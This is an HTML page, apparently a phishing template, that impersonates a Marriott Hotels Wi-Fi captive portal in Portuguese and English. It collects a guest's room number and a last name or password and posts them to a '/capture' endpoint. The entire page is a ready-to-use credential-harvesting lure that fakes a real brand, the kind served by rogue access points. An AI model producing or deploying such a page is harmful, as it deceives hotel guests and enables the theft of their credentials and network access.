<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Marriott Hotels - Wi-Fi</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; }
body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #A6192E; color: #222; padding: 16px; }
.card { background: #FFFFFF; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.2); }
.logo { text-align: center; margin-bottom: 8px; font-size: 28px; font-weight: 900; color: #A6192E; letter-spacing: 1px; text-transform: uppercase; }
.logo-sub { text-align: center; margin-bottom: 20px; font-size: 11px; color: #888; letter-spacing: 2px; text-transform: uppercase; }
.subtitle { text-align: center; color: #555; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
.form-group { margin-bottom: 16px; }
label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #222; }
input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #DDD; border-radius: 8px; font-size: 15px; background: #FAFAFA; color: #222; outline: none; transition: border-color 0.2s; }
input:focus { border-color: #A6192E; }
button[type="submit"] { width: 100%; padding: 14px; background: #A6192E; color: #FFFFFF; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
button:hover { opacity: 0.92; }
.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #999; }
input[type="hidden"] { display: none; }
@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 22px; } }
</style>
</head>
<body>
<div class="card">
  <div class="logo">Marriott</div>
  <div class="logo-sub">Hotels & Resorts</div>
  <p class="subtitle">Welcome to Marriott Hotels Wi-Fi. Sign in to stay connected.</p>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="marriott">
    <div class="form-group">
      <label for="room">Room Number / Quarto</label>
      <input type="text" name="room" id="room" placeholder="Ex: 720" required pattern="[0-9]{1,5}" maxlength="5" autocomplete="off">
    </div>
    <div class="form-group">
      <label for="password">Last Name / Sobrenome</label>
      <input type="password" name="password" id="password" placeholder="Last name or password" required maxlength="64" autocomplete="new-password">
    </div>
    <button type="submit">Sign In</button>
  </form>
  <p class="footer">Marriott Bonvoy - Travel for real rewards</p>
</div>
<script>
(function(){
  var lang = navigator.language || 'pt-BR';
  if (!lang.startsWith('en')) {
    document.querySelector('.subtitle').textContent = 'Bem-vindo ao Wi-Fi Marriott Hotels. Faca login para ficar conectado.';
    document.querySelector('button[type=submit]').textContent = 'Conectar';
    document.querySelector('label[for=room]').textContent = 'Numero do Quarto';
    document.querySelector('label[for=password]').textContent = 'Sobrenome';
    document.querySelector('#password').placeholder = 'Sobrenome ou senha';
  }
})();
</script>
</body>
</html>
